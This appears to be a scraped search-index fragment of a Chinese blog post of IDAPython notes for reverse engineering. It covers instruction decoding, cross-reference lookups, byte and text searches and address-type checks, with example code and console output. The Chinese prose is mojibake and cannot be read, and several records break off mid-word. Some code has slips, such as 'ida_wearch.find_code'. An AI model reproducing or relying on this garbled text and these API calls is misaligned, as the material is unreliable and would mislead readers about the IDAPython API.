çš„æœ€å¼€å§‹å¤§å®¶åº”è¯¥å¾ˆç†Ÿæ‚‰äº†ï¼Œæˆ‘ä»¬åˆ©ç”¨äº†idautils.Functions()å’Œidc.get_func_attr(func, FUNCATTR_FLAGS)æ¥è·å–æ‰€æœ‰çš„å‡½æ•°ï¼Œç„¶åå‰”é™¤æ‰å…¶ä¸­åº“å‡½æ•°å’Œtrunkå‡½æ•°ï¼Œéšåæˆ‘ä»¬åˆåˆ©ç”¨idautils.FuncItems(ea)æ¥è·å–æ¯ä¸ªå‡½æ•°çš„æŒ‡ä»¤ã€‚åˆ°è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨äº†ä¸€ä¸ªæ–°å‡½æ•°idaapi.decode_insn(insn, ea)ï¼Œè¿™ä¸ªå‡½æ•°éœ€è¦ä¼ å…¥æˆ‘ä»¬æƒ³è¦è§£è¯»çš„æ¯ä¸ªæŒ‡ä»¤çš„å¼€å§‹åœ°å€ã€‚ä¸€æ—¦è¿™ä¸ªæŒ‡ä»¤æˆåŠŸçš„è¢«è§£è¯»ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡insnæ¥è·å–è¯¥æŒ‡ä»¤çš„ä¸åŒå±æ€§å’Œå‚æ•°ã€‚ Python\u003edir(insn) ['Op1', 'Op2', 'Op3', 'Op4', 'Op5', 'Op6', '__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__get_auxpref__', '__get_operand__', '__get_ops__', '__getattribute__', '__getitem__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__set_auxpref__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__swig_destroy__', '__weakref__', 'add_cref', 'add_dref', 'add_off_drefs', 'assign', 'auxpref', 'create_op_data', 'create_stkvar', 'cs', 'ea', 'flags', 'get_canon_feature', 'get_canon_mnem', 'get_next_byte', 'get_next_dword', 'get_next_qword', 'get_next_word', 'insnpref', 'ip', 'is_64bit', 'is_canon_insn', 'is_macro', 'itype', 'ops', 'segpref', 'size', 'this', 'thisown'] æˆ‘ä»¬ä½¿ç”¨äº† insn.Op1.type æ¥è·å–æ“ä½œæ•°çš„ç±»å‹ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œæ“ä½œæ•°çš„èµ·å§‹ç´¢å¼•å¹¶ä¸æ˜¯ idc.get_operand_type(ea,n)ä¸­çš„ 0ï¼Œè€Œæ˜¯ 1ã€‚ç„¶åæˆ‘ä»¬ç”¨idc.print_operand(ea, n)æ£€æŸ¥ä¸¤ä¸ªæ“ä½œæ•°ä¸­å“ªä¸ªçš„ç±»å‹æ˜¯ o_displã€‚ æˆ‘ä»¬å·²ç»è·å–äº†æ“ä½œç¬¦çš„å­—ç¬¦ä¸²è¡¨ç¤ºï¼Œé‚£ä¹ˆæˆ‘ä»¬æ£€æŸ¥æ“ä½œç¬¦ä¸­æ˜¯å¦åŒ…å«äº†â€œbpâ€å­—ç¬¦ä¸²ï¼Œè¿™æ˜¯ä¸€ä¸ªå¿«é€Ÿåˆ¤æ–­æ“ä½œç¬¦çš„ä¸­å¯„å­˜å™¨æ˜¯å¦ä¸º bpï¼Œebp æˆ– è€… rbp çš„æ–¹æ³•ã€‚æ£€æŸ¥â€bpâ€å­—ç¬¦ä¸²çš„ç›®çš„åœ¨äºç¡®å®šåç§»é‡æ˜¯å¦æ˜¯ä¸€ä¸ªè´Ÿæ•°ã€‚æˆ‘ä»¬ä½¿ç”¨insn.Op1.addr æ¥è·å–åç§»é‡ï¼Œè¿™ä¸ªæ–¹æ³•ä¼šè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ç„¶åæˆ‘ä»¬æŠŠä»–è½¬æ¢æˆä¸ºä¸€ä¸ª integer ç±»å‹ï¼Œå¦‚æœéœ€è¦çš„è¯æŠŠå®ƒè½¬æ¢ä¸ºæ­£æ•°ï¼Œç„¶åæˆ‘ä»¬æŠŠå®ƒæ”¾è¿›è„šæœ¬æœ€å¼€å§‹å®šä¹‰çš„å­—å…¸ display ä¸­å»ã€‚è¿™æ ·å°±å®Œæˆäº†æˆ‘ä»¬çš„æ“ä½œï¼Œä¹‹åå¦‚æœä½ æƒ³è¦æŸ¥æ‰¾ä½¿ç”¨æŸä¸ªåç§»é‡çš„æ‰€æœ‰åœ°å€ï¼Œè¯·ä½¿ç”¨å¦‚ä¸‹æ‰€ç¤ºçš„ä»£ç å³å¯ï¼š for x in displace[0x130]: print(hex(x), GetDisasm(x)) ä¾‹å­2 æœ‰æ—¶å€™æˆ‘ä»¬åœ¨é€†å‘åˆ†æä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶çš„å†…å­˜è½¬å‚¨çš„æ—¶å€™ï¼Œæœ‰äº›æ“ä½œæ•°å°±ä¸æ˜¯ä¸€ä¸ªåç§»é‡äº†ã€‚çœ‹å¦‚ä¸‹ä»£ç ï¼š seg000:00BC1388 push 0Ch seg000:00BC138A push 0BC10B8h seg000:00BC138F push [esp+10h+arg_0] seg000:00BC1393 call ds:_strnicmp ç¬¬äºŒä¸ªè¢« push çš„å€¼æ˜¯ä¸€ä¸ªå­˜åœ¨å†…å­˜ä¸­çš„åç§»ã€‚å¦‚æœæˆ‘ä»¬é€šè¿‡å³é”®æŠŠè¿™ä¸ªåç§»å®šä¹‰ä¸ºdata ç±»å‹ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸ªåç§»å…¶å®æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²(å°±æ˜¯ç¨‹åºé‡Œé™æ€çš„å­—ç¬¦ä¸²)ï¼Œå½“ç„¶å®Œæˆè¿™ä¸ªå®šä¹‰æ“ä½œå¾ˆç®€å•ï¼Œä½†æ˜¯ï¼Œä½ æ‡‚çš„ï¼Œæœ‰æ—¶å€™è¿™ç§æ“ä½œå¤ªå¤šäº†è¯å°±éœ€è¦å†™ä¸€ä¸ªè„šæœ¬æ¥è‡ªåŠ¨å®Œæˆè¿™ä»¶äº‹æƒ…çš„è¯´ã€‚ min = ida_ida.inf_get_min_ea() max = ida_ida.inf_get_max_ea() # for each known function for func in idautils.Functions(): flags = idc.get_func_attr(func, FUNCATTR_FLAGS) # skip library \u0026 thunk functions if flags \u0026 FUNC_LIB or flags \u0026 FUNC_THUNK: continue dism_addr = list(idautils.FuncItems(func)) for curr_addr in dism_addr: if idc.get_operand_type(curr_addr, 0) == 5 and (min \u003c idc.get_operand_value(curr_addr,0) \u003c max): idc.op_plain_offset(curr_addr, 0, 0) if idc.get_operand_type(cu","date":"2021-03-01","objectID":"/idapython/:1:6","tags":["reverse"],"title":"idapythonç¬”è®°","uri":"/idapython/"},{"categories":["reverse"],"content":"äº¤å‰å¼•ç”¨(Xrefs) èƒ½å¤Ÿå®šä½ data æ®µå’Œ code æ®µçš„äº¤å‰å¼•ç”¨æ˜¯éå¸¸é‡è¦çš„ï¼Œäº¤å‰å¼•ç”¨çš„é‡è¦æ€§åœ¨äºå®ƒèƒ½å¤Ÿæä¾›æŸä¸ªç¡®å®šçš„æ•°æ®æˆ–è€…æŸä¸ªå‡½æ•°è¢«è°ƒç”¨çš„ä½ç½®ã€‚ä¸¾ä¸ªæ —å­ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦çŸ¥é“å“ªäº›åœ°å€è°ƒç”¨äº† WriteFile()å‡½æ•°ï¼Œæˆ‘ä»¬æ‰€è¦åšçš„å°±æ˜¯åœ¨å¯¼å…¥è¡¨ä¸­æ‰¾åˆ° WriteFile()å‡½æ•°ï¼Œç„¶åæŸ¥çœ‹å…¶äº¤å‰å¼•ç”¨å³å¯ã€‚ wf_addr = idc.get_name_ea_simple(\"_puts\") print(hex(wf_addr), idc.GetDisasm(wf_addr)) # 0x202150 extrn puts:near for addr in idautils.CodeRefsTo(wf_addr, 0): print(hex(addr), idc.GetDisasm(addr)) # æ‰“å°å‡ºè¯¥ API çš„æ‰€æœ‰äº¤å‰å¼•ç”¨ æˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨ idautils.Names()å‡½æ•°æ¥è·å–åœ¨ IDA ä¸­ä»»ä½• API å’Œè¢«é‡å‘½åçš„å‡½æ•°çš„ç›¸å…³ä¿¡æ¯ï¼Œè¯¥å‡½æ•°å°†è¿”å›ä¸€ä¸ªç±»å‹ä¸º(ea, str_name)çš„å…ƒç»„ã€‚ å‡½æ•°idautils.DataRefsTo(ea)åªæœ‰ä¸€ä¸ªåœ°å€å‚æ•°ï¼Œå®ƒè¿”å›è¯¥æ•°æ®åœ°å€çš„æ‰€æœ‰äº¤å‰å¼•ç”¨(è¿­ä»£å™¨)ã€‚ é‡ç‚¹æ¥äº†ï¼ï¼ï¼ è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨å‰é¢æ‰€æåˆ°çš„æœ‰ä¸€ç§æ›´åŠ é€šç”¨çš„æ–¹æ³•æ¥è·å–äº¤å‰å¼•ç”¨ï¼Œè¯¥æ–¹æ³•è°ƒç”¨ä¸¤ä¸ªå‡½æ•°å°±èƒ½å®Œæˆè·å–æ‰€æœ‰äº¤å‰å¼•ç”¨åœ°å€å’Œè°ƒç”¨åœ°å€çš„æ•ˆæœï¼Œè¿™ä¸¤ä¸ªå‡½æ•°å°±æ˜¯ idautils.XrefsTo(ea, flags=0)å’Œ idautils.XrefsFrom(ea, flags=0) for xref in idautils.XrefsTo(ea, 1): print(xref.type, idautils.XrefTypeName(xref.type), hex(xref.frm), hex(xref.to), xref.iscode) å¯¹äºåˆšåˆšçš„externï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ · print(hex(xref.frm), idc.GetDisasm(xref.frm)) # 0x201f80 dq offset puts è·å¾—çš„å…¶å®æ˜¯putsçš„gotè¡¨åœ°å€ã€‚è·³è½¬åˆ°gotè¡¨å†æ¬¡ä½¿ç”¨ä¸Šé¢çš„ä»£ç ï¼Œæˆ‘ä»¬å¾—åˆ°äº†putsçš„pltè¡¨ï¼Œå†ä½¿ç”¨å°±è·å¾—äº†æ‰€æœ‰çš„call putsäº†ã€‚è¿™å¯ä»¥ç»™æˆ‘ä»¬æä¾›ä¸€ä¸ªæ€è·¯å»æ£€ç´¢æˆ‘ä»¬æƒ³è¦çš„å±é™©å‡½æ•°è°ƒç”¨ã€‚ å›åˆ°æ­£é¢˜ï¼Œç¬¬ä¸€è¡Œæ˜¾ç¤ºäº†ä¸€ä¸ªå­—ç¬¦ä¸²çš„çš„åœ°å€ï¼Œæˆ‘ä»¬ä½¿ç”¨idautils.XrefsTo(ea,1)æ¥è·å–è¯¥å­—ç¬¦ä¸²çš„æ‰€æœ‰äº¤å‰å¼•ç”¨ã€‚æˆ‘ä»¬ä½¿ç”¨xref.typeæ¥æŒ‡æ˜è¯¥äº¤å‰å¼•ç”¨çš„ç±»å‹ï¼Œidautils.XrefTypeName(xref.type)ç”¨æ¥æ‰“å°è¡¨ç¤ºè¯¥ç±»å‹çš„å«ä¹‰ï¼Œè¿™å…¶ä¸­æœ‰åäºŒç§ä¸åŒçš„ç±»å‹ã€‚ 0 = 'Data_Unknown' 1 = 'Data_Offset' 2 = 'Data_Write' 3 = 'Data_Read' 4 = 'Data_Text' 5 = 'Data_Informational' 16 = 'Code_Far_Call' 17 = 'Code_Near_Call' 18 = 'Code_Far_Jump' 19 = 'Code_Near_Jump' 20 = 'Code_User' 21 = 'Ordinary_Flow' xref.frm æ‰“å°å‡ºè¯¥åœ°å€çš„äº¤å‰å¼•ç”¨ï¼Œxref.to æ‰“å°å‡ºæ”¹åœ°å€æœ¬èº«ï¼Œxref.iscode æ‰“å°å‡ºè¯¥äº¤å‰å¼•ç”¨æ˜¯å¦åœ¨ä»£ç æ®µä¸­ï¼Œä¸Šè¿°çš„ä»£ç æˆ‘ä»¬ä½¿ç”¨äº† idautils.XrefsTo(ea, 1)å¹¶å°†å…¶ flag ä½è®¾ä¸ºäº†1ï¼Œå¦‚æœæˆ‘ä»¬å°† flag è®¾ä¸º 0 çš„è¯ï¼Œé‚£ä¹ˆå®ƒå°†ä¼šæ˜¾ç¤ºè¯¥åœ°å€çš„ä»»æ„äº¤å‰å¼•ç”¨ï¼Œä¸¾ä¸ªæ —å­ï¼š .text:1000AAF6 jnb short loc_1000AB02 ; XREF .text:1000AAF8 mov eax, [ebx+0Ch] .text:1000AAFB mov ecx, [esi] .text:1000AAFD sub eax, edi .text:1000AAFF mov [edi+ecx], eax .text:1000AB02 .text:1000AB02 loc_1000AB02: ; ea is here() .text:1000AB02 mov byte ptr [ebx], å¾ˆæ˜¾ç„¶AAF6å¼•ç”¨äº†eaï¼Œä½†æ˜¯å¦‚æœflagä¸º0çš„è¯ç»“æœè¿˜ä¼šæœ‰AAFFä¹Ÿå°±æ˜¯ç¨‹åºæ­£å¸¸æ‰§è¡Œæµã€‚ è¿™ç§æ–¹æ³•å¯¹äºæˆ‘ä»¬è‡ªå·±å‘½åçš„ä¹Ÿæœ‰ç”¨ã€‚ idc.set_name(ea, \"RtlCompareMemory\", SN_CHECK) for xref in idautils.XrefsTo(ea, 1): print(xref.type, idautils.XrefTypeName(xref.type), hex(xref.frm), hex(xref.to), xref.iscode) å½“ç„¶æ‰“å°æ‰€æœ‰çš„äº¤å‰å¼•ç”¨å¯èƒ½ä¼šæ„Ÿè§‰æœ‰ç‚¹å„¿é‡å¤çš„è¯´ã€‚ Python\u003eprint hex(ea), idc.GetDisasm(ea) 0xa21138 extrn GetProcessHeap:dword Python\u003efor xref in idautils.XrefsTo(ea, 1): print xref.type, idautils.XrefTypeName(xref.type), hex(xref.frm), hex(xref.to), xref.iscode Python\u003e 17 Code_Near_Call 0xa143b0 0xa21138 1 17 Code_Near_Call 0xa1bb1b 0xa21138 1 3 Data_Read 0xa143b0 0xa21138 0 3 Data_Read 0xa1bb1b 0xa21138 0 Python\u003eprint(idc.GetDisasm(0xa143b0)) call ds:GetProcessHeap é‡å¤æ€§æ¥è‡ªäº Data_Read å’Œ Code_Near ç±»å‹çš„äº¤å‰å¼•ç”¨éƒ½è¢«è¯†åˆ«å‡ºæ¥ï¼Œæ‰€ä»¥ä¸‹é¢åˆ©ç”¨set çš„æ–¹æ³•å¯ä»¥ ç²¾ç®€ä¸€ä¸‹è¿™äº›åœ°å€ï¼š def get_to_xrefs(ea): xref_set = set([]) for xref in idautils.XrefsTo(ea, 1): xref_set.add(xref.frm) return xref_set def get_frm_xrefs(ea): xref_set = set([]) for xref in idautils.XrefsFrom(ea, 1): xref_set.add(xref.to) return xref_set ç²¾ç®€åçš„ä¾‹å­ï¼š Python\u003eprint(hex(ea), idc.GetDisasm(ea)) 0xa21138 extrn GetProcessHeap:dword Python\u003eget_to_xrefs(ea) set([10568624, 10599195]) Python\u003e[hex(x) for x in get_to_xrefs(ea)] ['0xa143b0', '0xa1bb1b'] ","date":"2021-03-01","objectID":"/idapython/:1:7","tags":["reverse"],"title":"idapythonç¬”è®°","uri":"/idapython/"},{"categories":["reverse"],"content":"æœç´¢ æˆ‘ä»¬å…¶å®å·²ç»èƒ½å¤Ÿé€šè¿‡éå†æ‰€æœ‰å·²çŸ¥çš„å‡½æ•°åŠå…¶æŒ‡ä»¤æ¥è¾¾åˆ°ä¸€ç§åŸºæœ¬çš„æœç´¢æ•ˆæœï¼Œè¿™å½“ç„¶å¾ˆæœ‰ç”¨ï¼Œä½†æ˜¯æœ‰æ—¶å€™æˆ‘ä»¬éœ€è¦æœç´¢ä¸€äº›ç‰¹å®šçš„å­—èŠ‚ï¼Œæ¯”å¦‚è¯´ 0x55,0x8b,0xec è¿™ç§å­—èŠ‚åºåˆ—ï¼Œè¿™ 3 ä¸ªå­—èŠ‚å…¶å®ä»£è¡¨çš„æ±‡ç¼–ä»£ç ä¸º push ebp, mov ebp, esp ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨idc.FindBinary(ea,flag, searchstr, radix=16)æ¥å®è¡Œå­—èŠ‚æˆ–è€…äºŒè¿›åˆ¶çš„æœç´¢ã€‚ea ä»£è¡¨å•¥å°±ä¸è¯´äº†ï¼Œflag ä»£è¡¨æœç´¢æ–¹å‘æˆ–è€…æ¡ä»¶ã€‚ SEARCH_UP = 0 SEARCH_DOWN = 1 SEARCH_NEXT = 2 SEARCH_CASE = 4 SEARCH_REGEX = 8 SEARCH_NOBRK = 16 SEARCH_NOSHOW = 32 SEARCH_UNICODE = 64 SEARCH_IDENT = 128 SEARCH_BRK = 256 ä¸Šé¢çš„ç±»å‹ä¸å¿…è¦éƒ½çœ‹ä¸€éï¼Œä½†æ˜¯è¿˜æ˜¯è¦çœ‹çœ‹ä¸€äº›å¸¸ç”¨çš„ç±»å‹ï¼š SEARCH_UP å’Œ SEARCH_DOWN ç”¨æ¥æŒ‡æ˜æœç´¢çš„æ–¹å‘ SEARCH_NEXT ç”¨æ¥è·å–ä¸‹ä¸€ä¸ªå·²ç»æ‰¾åˆ°çš„å¯¹è±¡ SEARCH_CASE ç”¨æ¥æŒ‡æ˜æ˜¯å¦åŒºåˆ†å¤§å°å†™ SEARCH_NOSHOW ç”¨æ¥æŒ‡æ˜æ˜¯å¦æ˜¾ç¤ºæœç´¢çš„è¿›åº¦ SEARCH_UNICODE ç”¨äºå°†æ‰€æœ‰æœç´¢å­—ç¬¦ä¸²è§†ä¸º Unicode pattern = '55 48 89 E5' addr = ida_ida.inf_get_min_ea() for x in range(0,5): addr = idc.find_binary(addr, SEARCH_DOWN|SEARCH_NEXT, pattern) if addr != idc.BADADDR: print(hex(addr), idc.GetDisasm(addr)) ç»“æœï¼š Python\u003e 0x911 push rbp 0x940 push rbp 0x94a push rbp 0x9ea push rbp 0xa84 push rbp ç¬¬ä¸€è¡Œæˆ‘ä»¬å®šä¹‰äº†è¦æœç´¢çš„å½¢å¼ï¼Œæœç´¢å½¢å¼å¯ä»¥æ˜¯ 16 è¿›åˆ¶æ ¼å¼ï¼Œæ¯”å¦‚ 0x55 0x8B 0xECå’Œ 55 8B EC éƒ½æ˜¯å¯ä»¥çš„ï¼Œ\\x55\\x8B\\xEC è¿™ç§æ ¼å¼å¯ä¸è¡Œï¼Œé™¤éä½ ä½¿ç”¨ idc.find_text(ea, flag, y, x, searchstr)è¿™ä¸ªå‡½æ•°ã€‚ida_ida.inf_get_min_ea()ç”¨æ¥è·å–å¯æ‰§è¡Œæ–‡ä»¶çš„æœ€å¼€å§‹çš„åœ°å€ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°†idc.find_binary(ea, flag,searchstr, radix=16)çš„è¿”å›ç»“æœè®¾ç½®ä¸º addr å˜é‡ã€‚åœ¨æœç´¢æ—¶æœ€é‡è¦çš„æ˜¯éªŒè¯ç»“æœæ˜¯å¦ç¬¦åˆé¢„æœŸï¼Œé¦–å…ˆæˆ‘ä»¬å°†åœ°å€ä¸ idc.BADADDR è¿›è¡Œæ¯”è¾ƒï¼Œç„¶åæ‰“å°å‡ºè¯¥åœ°å€å’Œè¯¥åœ°å€çš„åæ±‡ç¼–ç»“æœã€‚ æœç´¢å­—èŠ‚åºåˆ—æ˜¯å¾ˆæœ‰ç”¨çš„ï¼Œä½†æ˜¯æœ‰æ—¶å€™æˆ‘ä»¬æƒ³è¦æŸ¥æ‰¾ç±»ä¼¼äºâ€œchrome.dllâ€è¿™æ ·çš„å­—ç¬¦ä¸²ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ hex(y)å‡½æ•°æ¥å°†â€œchrome.dllâ€å­—ç¬¦ä¸²è½¬æ¢æˆä¸º 16 è¿›åˆ¶çš„å­—èŠ‚åºåˆ—ï¼Œä½†æ˜¯ï¼Œå¤ªè ¢äº†ï¼Œå¦‚æœå­—ç¬¦ä¸²æ˜¯ unicode æ ¼å¼å‘¢ï¼Œä½ è¿˜å¾—é‡æ–°è€ƒè™‘äº†ï¼Œå¥½äº†ï¼Œä¸ç’å„ä½ï¼Œæœ€å¥½çš„æ–¹æ³•æ˜¯find_text(ea,flag, y, x, searchstr) ã€‚è¿™ä¸ªå‡½æ•°çœ‹èµ·æ¥æ˜¯ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œå› ä¸ºå®ƒå¾ˆåƒå‡½æ•°idc.find_binary çš„è¯´ï¼Œå‚æ•°é‡Œé¢ï¼Œea æ˜¯åœ°å€ï¼Œflag æ˜¯æœç´¢æ–¹å‘å’Œæœç´¢ç±»å‹ã€‚y æ˜¯ä» ea å¼€å§‹æœç´¢çš„è¡Œæ•°ï¼Œx æ˜¯è¡Œä¸­çš„åæ ‡ã€‚è¿™ä¸¤ä¸ªå‚æ•°é€šå¸¸ç½® 0ï¼Œç°åœ¨æˆ‘ä»¬å¼€å§‹æŸ¥æ‰¾å­—ç¬¦ä¸²â€œAcceptâ€çš„å‡ºç°çš„æ¬¡æ•°ã€‚å½“ç„¶ä½ å¯ä»¥æ¢æ¢å…¶ä»–çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥ä»å­—ç¬¦ä¸²çª—å£(shift+F12)è·å¾—ã€‚ cur_addr = ida_ida.inf_get_min_ea() end = ida_ida.inf_get_max_ea() while cur_addr \u003c end: cur_addr = idc.find_text(cur_addr, SEARCH_DOWN, 0, 0, \"Exit\") if cur_addr == idc.BADADDR: break else: print(hex(cur_addr), idc.GetDisasm(cur_addr)) cur_addr = idc.next_head(cur_addr) ç»“æœï¼š Python\u003e 0x408 Elf64_Sym \u003coffset aExit - offset byte_468, 12h, 0, 0, offset dword_0, \\; \"exit\" 0x473 db 'exit',0 0x760 Elf64_Rela \u003c201FB8h, 0E00000007h, 0\u003e; R_X86_64_JUMP_SLOT exit 0x820 jmp cs:exit_ptr 0xa49 call _exit 0xafd lea rdi, a3Exit; \"3.Exit\" 0xb75 call _exit 0xbaf call _exit 0xc99 call _exit 0xcf2 push rbp 0xd1e leave 0xd1f retn æˆ‘ä»¬åˆ©ç”¨ ida_ida.inf_get_min_ea()æ¥è·å–å¯æ‰§è¡Œæ–‡ä»¶çš„æœ€å°åœ°å€ï¼Œ å°†å…¶èµ‹ç»™ cur_addrã€‚åˆ©ç”¨ ida_ida.inf_get_max_ea()èµ‹å€¼ç»™ endã€‚å› ä¸ºä¸çŸ¥é“è¯¥å­—ç¬¦ä¸²å‡ºç°çš„æ¬¡æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬ä»ä¸Šå¾€ä¸‹æœç´¢ç›´åˆ°æœ€å¤§åœ°å€ã€‚æˆ‘ä»¬æŠŠidc.find_text çš„è¿”å›å€¼èµ‹ç»™ cur_addrã€‚å› ä¸ºæˆ‘ä»¬åˆ©ç”¨äº† idc.next_head(ea)ä½¿å½“å‰åœ°å€ä¸æ–­å¢é•¿ï¼Œæ‰€ä»¥å°±ä¸éœ€è¦åœ¨ idc.find_text()ä¸­æ·»åŠ  SEARCH_NEXT çš„æ ‡å¿—ã€‚ä¸ºä»€ä¹ˆæˆ‘ä»¬è¦æ‰‹åŠ¨çš„å¢åŠ åœ°å€å‘¢ï¼Œå› ä¸ºä¸€è¡Œå­—ç¬¦ä¸²ä¸­å¯èƒ½å‡ºç°å¤šæ¬¡è¦æŸ¥æ‰¾çš„å­—ç¬¦ä¸²ï¼Œå¾€ä¸Šç¿»è®¤çœŸé˜…è¯» SEARCH_NEXTçš„æ ‡å¿—çš„æ„æ€ï¼Œä½ å°±å‘ç°ä¸æ‰‹åŠ¨çš„è¯ä¼šé™·å…¥ä¸€ä¸ªæ­»å¾ªç¯(ä½†æ˜¯æµ‹è¯•çš„æ—¶å€™ï¼Œç®—äº†ä½ ä»¬è‡ªå·±æµ‹å§ï¼Œä¼°è®¡æˆ‘æµ‹çš„æœ‰é—®é¢˜)ã€‚ é™¤äº†ä»¥ä¸Šè¿°æè¿°çš„æœç´¢æ–¹å¼ä»¥ä¸ºï¼Œè¿˜æœ‰ä¸€ç³»åˆ—çš„å‡½æ•°ç”¨æ¥æŸ¥æ‰¾å…¶ä»–ç±»å‹ã€‚é€šè¿‡è¿™å†™ APIçš„åç§°å°±èƒ½å®¹æ˜“çš„è¯†åˆ«å‡ºå®ƒä»¬çš„åŠŸèƒ½ï¼Œåœ¨è®¨è®ºæŸ¥æ‰¾å…¶ä»–ç±»å‹ä¹‹å‰æˆ‘ä»¬é¦–å…ˆæ¥çœ‹ä¸€ä¸‹å¦‚ä½•é€šè¿‡åœ°å€æ¥è¯†åˆ«ä»–ä»¬çš„ç±»å‹ï¼ŒIDAPython ä¸­æœ‰å¦‚ä¸‹çš„ä¸€äº›å‡½æ•°ç”¨æ¥åˆ¤æ–­ä¸€ä¸ªåœ°å€çš„ç±»å‹ï¼Œè¿™äº›APIs è¿”å›çš„æ˜¯ bool å€¼ True æˆ–è€… Falseã€‚ ida_bytes.is_code(f)ï¼šåˆ¤æ–­ IDA æ˜¯å¦å°†å…¶åˆ¤å®šä¸ºä»£ç  ida_bytes.is_data(f)ï¼šåˆ¤æ–­ IDA æ˜¯å¦å°†å…¶åˆ¤å®šä¸ºæ•°æ® ida_bytes.is_tail(f)ï¼šåˆ¤æ–­ IDA æ˜¯å¦å°†å…¶åˆ¤å®šä¸ºå°¾éƒ¨ ida_bytes.is_unknown(f)ï¼šåˆ¤æ–­ IDA æ˜¯å¦å°†å…¶åˆ¤å®šä¸ºæœªçŸ¥ï¼Œå³æ—¢ä¸æ˜¯æ•°æ®ï¼Œä¹Ÿä¸æ˜¯ä»£ç  ida_bytes.is_head(f)ï¼šåˆ¤æ–­ IDA æ˜¯å¦å°†å…¶åˆ¤å®šä¸ºå¤´éƒ¨ f è¿™ä¸ªå‚æ•°æ˜¯æ–°å‡ºç°çš„ï¼Œç›¸æ¯”èµ·äºä¼ é€’åœ°å€ï¼Œæˆ‘ä»¬è¿˜è¦å…ˆé€šè¿‡ ida_bytes.get_full_flags(ea)è·å–åœ°å€çš„å†… éƒ¨æ ‡å¿—è¡¨ç¤ºï¼Œç„¶åå†ä¼ ç»™ idc.is ç³»åˆ—å‡½æ•°å½“å‚æ•°ï¼Œä»£ç å¦‚ä¸‹ï¼š idc.is_code(ida_bytes.get_full_flags(ea)) ida_search.find_code(ea, flag)ï¼šè¯¥å‡½æ•°ç”¨æ¥å¯»æ‰¾è¢«æ ‡å¿—ä¸ºä»£ç çš„ä¸‹ä¸€ä¸ªåœ°å€ è¿™å¯¹æˆ‘ä»¬æƒ³è¦æŸ¥æ‰¾æ•°æ®å—çš„æœ«å°¾æ˜¯å¾ˆæœ‰å¸®åŠ©çš„ã€‚å¦‚æœ ea æ˜¯ä»£ç åœ°å€ï¼Œé‚£ä¹ˆè¯¥å‡½æ•°è¿”å›ä¸‹ä¸€ä¸ªä»£ç åœ°å€ï¼Œflag å‚æ•°çœ‹å‰é¢çš„ idc.find_textå°±å¯ä»¥äº†ã€‚ä¾‹å­ï¼š Python\u003eprint(hex(ea), idc.GetDisasm(ea)) 0x4140e8 dd offset dword_4140EC Python\u003eaddr = ida_wearch.find_code(ea, SEARCH_DOWN|SEARCH_NEXT) Python\u003eprint(hex(addr), idc.GetDisasm(addr)) 0x41410c push ebx å¯ä»¥çœ‹åˆ°0x4140e8æ˜¯æŸä¸ªæ•°æ®çš„åœ°å€ã€‚æˆ‘ä»¬å°†idc.find_code(ea,SEARCH_DOWN|SEARCH_NEXT)çš„è¿”å›å€¼èµ‹ç»™addrï¼Œç„¶åæ‰“å°å‡ºè¯¥åœ°å€å’Œå®ƒçš„åæ±‡ç¼–ä»£ç ã€‚é€šè¿‡è¯¥å‡½æ•°æˆ‘ä»¬ç›´æ¥è·³è¿‡äº†36ä¸ªå­—èŠ‚è·å–åˆ°äº†ä»£ç æ®µçš„é¦–åœ°å€ã€‚ ida_search.find_dataï¼šè¯¥å‡½æ•°å’Œä¸Šä¸€ä¸ªå‡½æ•° FindCode()å·®ä¸å¤šï¼Œé™¤äº†å®ƒè¿”å›çš„æ˜¯æ•°æ®æ®µçš„åœ°å€ æˆ‘ä»¬åè½¬ä¸€ä¸‹ä¸Šä¸€ä¸ªåœºæ™¯ï¼Œç„¶åé€šè¿‡ä»£ç æ®µåœ°å€å»å¯»æ‰¾æ•°æ®æ®µé¦–åœ°å€ï¼Œä»£ç å¦‚ä¸‹ Python\u003eprint(hex(ea), idc.GetDisasm(ea)) 0x41410c push ebx Python\u003eaddr = ida_search.find_data(ea, SEARCH_UP|SEARCH_NEXT) Python\u003eprint(hex(addr), idc.GetDisasm(addr)) 0x4140ec dd 49540E0Eh, 746E6564h, 4570614Dh, 7972746Eh, 8, 1,4010BCh ida_search.find_unknown(ea, flag):è¯¥åŠŸèƒ½ç”¨äºæŸ¥æ‰¾ IDA æœªè¯†åˆ«ä¸ºä»£ç æˆ–æ•°æ®çš„å­—èŠ‚åœ°å€ æœªçŸ¥ç±»å‹éœ€è¦é€šè¿‡è§‚å¯Ÿæˆ–è„šæœ¬è¿›ä¸€æ­¥æ‰‹åŠ¨åˆ†æã€‚ Python\u003eprint(hex(ea), idc.GetDisasm(ea)) 0x406a05 jge short loc_406A3A Python\u003eaddr = ida_search.find_unknown(ea, SEARCH_DOWN) Python\u003eprint(hex(ad","date":"2021-03-01","objectID":"/idapython/:1:8","tags":["reverse"],"title":"idapythonç¬”è®°","uri":"/idapython/"},{"categories":["reverse"],"content":"æ•°æ®é€‰å– æœ‰æ—¶å€™æˆ‘ä»¬å¹¶ä¸æ˜¯åªæƒ³å†™è‡ªåŠ¨æŸ¥æ‰¾æ•°æ®å’Œä»£ç çš„è„šæœ¬ï¼Œä¹Ÿè®¸ä½ å·²ç»çŸ¥é“äº†ä»£ç 